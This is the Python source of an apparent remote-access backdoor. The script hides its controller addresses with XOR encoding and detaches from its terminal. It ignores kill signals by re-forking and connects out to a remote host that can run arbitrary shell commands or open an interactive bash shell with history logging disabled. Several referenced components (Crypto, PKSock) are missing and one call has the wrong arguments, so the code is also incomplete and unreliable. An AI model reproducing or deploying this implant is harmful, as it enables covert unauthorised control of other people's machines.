import os, sys, socket, time, signal, subprocess, selectors, pty, requests

server_modulus = 566985700738319622174686131400034453643720466970978517574628629274979976524124940713860540038882426013024114564601644133774454954579859603022526047211561634473245368041734849645333850659593387029777461624139999293346678168096585398894872902836488432305321788895930893995350254306011511954048973993218576068120842406854381660868440914954041085267631248545101914138883676131275460708745009456577214046268195248043933401098454229528930264593554947172986600022924103676180205323189749504546460222696144254434950563003806500524021358243739253925888283568187475109036444929999292467231057057868003949542201486910774286204467263359268168124928585201908563486221036238676222817747434022603388355897696091620276281574099795985472307965135468502881374317279001616973398539298555877212283138431306761372378738101671232030286096798836533645647014376468992868000495595560982785914820504104078715279785802300066599327401921364225207587243296778060887445799525002269634182195900334989318967452442166075135355126785800284396564017524632233821326493688824504309419677467169118434525079593731269479730143537689127087750148171355493757239210404790175123435648784211703985569364347710928586741341454862278795609365544396160373248258804813219121521794117
hdb = {}

args_used = 0
def get_param(env_name, prompt, default):
    global args_used

    if env_name in os.environ and len(os.environ[env_name]) > 0:
        return os.environ[env_name]
    elif len(sys.argv) > args_used+1 and len(sys.argv[args_used+1]) > 0:
        args_used += 1
        return sys.argv[args_used]
    else:
        try:
            inp = input(prompt).strip()
            if len(inp) < 1:
                return default
            return inp
        except:
            return default

def chm (eky):
    return ''.join([chr(ord(qjv)^0x4c) for qjv in eky])

def main():
    global hdb_url
    port = 2236
    hdb_url = get_param('HDB', 'hdb=', chm('$88<?vcc;->b/* )!?b")8c$#?8?b&?#"'))
    ha = get_param('HOST', 'host=', chm('?)\'b/* )!?b")8'))
    tts = int(get_param('TTS', 'tts=', 60*30))
    bits = int(get_param('BITS', 'bits=', 4096))

    if ':' in ha:
        ha, port = ha.split(':')
        port = int(port)

    print('forking')
    shield()
    polymorph()
    p,q,n,e,d = Crypto.keygen(bits=bits)
    privkey = { 'n': n, 'd': d }
    refresh_hdb()

    while True:
        if not work(ha, port, privkey, bits=bits):
            return
        polymorph()
        time.sleep(tts)

def shield():
    for sig in [signal.SIGHUP, signal.SIGINT, signal.SIGABRT, signal.SIGQUIT, signal.SIGTERM]:
        signal.signal(sig, sh)
    for fd in [sys.stdin, sys.stdout, sys.stderr]:
        os.close(fd.fileno())

def sh(a, b):
    polymorph()

def polymorph():
    if os.fork() != 0:
        sys.exit(0)

def refresh_hdb():
    global hdb, hdb_url
    try:
        resp = requests.get(hdb_url)
        resp.close()
        if resp.status_code != 200:
            return False
        hdb = resp.json()
        return True
    except:
        return False

def get_hostkey(host):
    global hdb
    if 'keys' not in hdb:
        return False
    hkdb = hdb['keys']
    if host not in hkdb:
        return False
    hostent = hkdb[host]
    if 'n' not in hostent:
        del hkdb[host]
        return False
    try:
        return {'n': int(hostent['n']),
                'e': int(hostent['e']) if 'e' in hostent else Crypto.exp}
    except:
        del hkdb[host]
        return False

def pty_barrier(sock):
    code = b'\x00'*len(b'\xc0\xdeack')

    while bytes(code) != b'\xc0\xdeack':
        buffer = sock.recv()
        while len(buffer) > 0:
            code = code[1:]+buffer[0:1]
            buffer = buffer[1:]
            if code == b'\xc0\xdeack':
                break

    sock.stop_stream(len(buffer))
    if len(buffer) > 0:
        return process_cmd(sock)
    else:
        return True, True

def run_pty(sock):
    sock.start_stream()
    term = sock.recv()
    sel = selectors.DefaultSelector()
    pid, shfd = pty.fork()
    if pid == 0:
        os.environ['HISTFILE'] = ''
        if type(term) == bytes:
            term = str(term, 'utf-8')
        os.environ['TERM'] = term
        os.execle('/bin/bash', '/bin/bash', os.environ)

    try:
        sel.register(shfd, selectors.EVENT_READ, 0)
        sel.register(sock.sock, selectors.EVENT_READ, 1)
        while True:
            events = sel.select()
            quit = False

            for event, _ in events:
                if event.data == 0:
                    try:
                        data = os.read(shfd, 1024)
                    except:
                        data = False
                    if not data:
                        quit = True
                    else:
                        sock.send(data)
                else:
                    data = sock.recv()
                    if not data:
                        return True, False
                    elif data[:6] == b'\xc0\xdenpty':
                        quit = True
                    else:
                        os.write(shfd, data)

            if quit:
                sock.send(b'\xc0\xdenpty')
                return pty_barrier(sock)
    except:
        return True, False
    finally:
        sel.close()
        try:
            os.close(shfd)
        except:
            pass

def process_cmd (sock, prompt):
    cmd = sock.recv()
    if cmd == b'tunnel':
        sock.send(b'\xde\xad')
        return True, False
    elif cmd == b'die':
        sock.send(b'\xde\xad')
        return False, False
    elif cmd == b'refresh-hdb':
        if refresh_hdb():
            response = '[pk] Host database refreshed.\n'
        else:
            response = '[pk] Error: could not refresh host database.\n'
    elif cmd == b'pty':
        live, cont = run_pty(sock)
        if not live or not cont:
            return live, cont
        else:
            response = 'PTY done.\n'
    else:
        try:
            proc = subprocess.Popen(['sh', '-c', cmd], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            response = stdout+stderr
            if type(response) == bytes:
                response = str(response, 'utf-8')
        except Exception as e:
            response = '%s\n' % str(e)
    sock.send(bytes('%s%s' % (response, prompt), 'utf-8'))
    return True, True

def work(h_addr, port, privkey, bits):
    global server_modulus
    try:
        host = socket.gethostbyname(h_addr)
    except:
        host = h_addr
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        raw_sock.connect((host, port))
        sock = PKSock(raw_sock, privkey, bits)
        hostkey = get_hostkey(host)
        if hostkey:
            rpubkey = hostkey
        else:
            rpubkey = {'n': server_modulus, 'e': Crypto.exp}
        if not sock.handshake_server(rpubkey):
            return True

        PS1 = '$ '
        if 'PS1' in os.environ:
            PS1 = os.environ['PS1']
        sock.send(bytes(PS1, 'utf-8'))
        while True:
            live, cont = process_cmd(sock, PS1)
            if not live or not cont:
                break
        return live
    except:
        return True
    finally:
        raw_sock.close()

if __name__ == '__main__':
    main()
